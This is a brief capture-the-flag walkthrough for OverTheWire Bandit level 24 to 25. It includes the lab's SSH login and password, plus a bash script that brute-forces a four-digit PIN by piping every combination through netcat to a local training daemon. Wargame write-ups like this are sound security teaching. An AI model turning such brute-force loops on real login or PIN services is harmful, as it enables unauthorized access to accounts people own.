# Bandit Level 24 â†’ Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.



```
ssh bandit24@bandit.labs.overthewire.org -p 2220
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

nano /tmp/brute_forcing.sh
#! /bin/bash
bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0..9}{0..9}{0..9}{0..9}
do
	echo $bandit24_pass' '$i >> /tmp/combinations.txt
done
cat /tmp/combinations.txt|nc localhost 30002|tail
